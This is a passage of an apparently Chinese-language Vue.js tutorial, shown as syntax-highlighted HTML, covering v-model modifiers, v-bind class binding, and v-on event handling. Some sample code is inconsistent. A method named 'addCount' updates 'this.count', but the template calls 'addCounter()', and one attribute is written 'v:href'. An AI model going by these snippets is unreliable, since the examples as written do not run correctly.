class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"修飾符號-modifiers\">修飾符號 modifiers</h3>\n<ul>\n<li><code>.lazy</code>: 改為使用 <code>onChange</code> 監聽，等到為非 focus 狀態（亦或是按下 Enter 鍵之後）才執行處理</li>\n<li><code>.number</code>: 將預設值的型態 <code>string</code> 轉為數值 <code>number</code></li>\n<li><code>.trim</code>: 刪除內容中的首尾空白，使用 <code>onChange</code> 監聽</li>\n</ul>\n<h2 id=\"屬性綁定\">屬性綁定</h2>\n<h3 id=\"屬性綁定指令\">屬性綁定指令</h3>\n<h4 id=\"v-bind--\"><code>v-bind</code> = <code>:</code></h4>\n<ul>\n<li>綁定 HTML 元素的屬性（attribute）至 Vue instance</li>\n<li>可省略為 <code>:</code></li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\"><span class=\"token namespace\">v-bind:</span>href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>url<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\"><span class=\"token namespace\">v-bind:</span>title</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hint<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>link1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\"><span class=\"token namespace\">v:</span>href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>url<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">:title</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hint<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>link1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    message<span class=\"token operator\">:</span> <span class=\"token string\">\"Hello World!\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><ul>\n<li>可使用 object 或 array 寫法綁定，稱為 Class &amp; Style Binding</li>\n</ul>\n<p>Object：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>menulist<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">:class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>{ active: isActive, hasError: isError }<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Home<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>About<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Work<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Contact<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    isActive<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n    isError<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>Object 2：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>menulist<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">:class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>classObject<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Home<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>About<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Work<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Contact<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    classObject<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n      active<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n      hasError<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>Array：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>menulist<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">:class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>[activeClass, errorClass]<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Home<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>About<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Work<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Contact<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    activeClass<span class=\"token operator\">:</span> <span class=\"token string\">\"active\"</span><span class=\"token punctuation\">,</span>\n    errorClass<span class=\"token operator\">:</span> <span class=\"token string\">\"hasError\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>三元運算式判斷：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>menulist<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">:class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>[isActive ? activeClass : <span class=\"token punctuation\">'</span><span class=\"token punctuation\">'</span>, errorClass]<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Home<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>About<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Work<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Contact<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    activeClass<span class=\"token operator\">:</span> <span class=\"token string\">\"active\"</span><span class=\"token punctuation\">,</span>\n    errorClass<span class=\"token operator\">:</span> <span class=\"token string\">\"hasError\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"修飾符號-modifiers-1\">修飾符號 Modifiers</h3>\n<ul>\n<li><code>.prop</code>: 改為綁定 DOM 的屬性 (property)</li>\n<li><code>.camel</code>: 2.1.0 版之後可用，\n├ 若欲綁定的屬性名稱為 kebab-case 命名法（即屬性名稱含有 <code>-</code>）\n│ 可使用此裝飾符號將屬性名稱改為 camelCase 命名法\n│ 但建立專案時使用含有 <code>vue-loader</code> 或 <code>vueify</code> 的編譯器（如：Webpack）\n└ 便不需使用此修飾符號。</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">:href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>url<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">:title.prop</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hint<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>link<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span> <span class=\"token punctuation\">/></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>svg</span> <span class=\"token attr-name\">:view-box.camel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewBox<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>svg</span><span class=\"token punctuation\">></span></span></code></pre><h2 id=\"事件處理\">事件處理</h2>\n<h3 id=\"選項物件屬性-methods\">選項物件屬性: <code>methods</code></h3>\n<p>methods 這個屬性用來定義方法，如果我們在 UI 操作了什麼動作\n都可以寫 methods 去回傳方法，執行相對應的事件\n通常 methods 定義方法的方式是一個包住 function 的 object\n方法寫好後，就需要有個地方去呼叫（觸發）這個方法\n此時我們可以在 HTML 元素中加入事件監聽器，使用的指令就是 <code>v-on</code></p>\n<h3 id=\"事件處理指令\">事件處理指令</h3>\n<h4 id=\"v-on--\"><code>v-on</code> = <code>@</code></h4>\n<ul>\n<li>在 HTML 元素中加入事件監聽器，即可找到的對應事件處理方法\n也就是我們在 vue instance 宣告的 methods</li>\n<li>可省略為 <code>@</code></li>\n</ul>\n<p>function：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>{{ counter }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token attr-name\"><span class=\"token namespace\">v-on:</span>click</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>addCounter()<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Counter Plus<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token attr-name\">@click</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>addCounter()<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Counter Plus<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    counter<span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  methods<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function-variable function\">addCount</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>count <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>inline statement：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>{{ counter }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token attr-name\"><span class=\"token namespace\">v-on:</span>click</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>counter += 1<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Counter Plus<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> 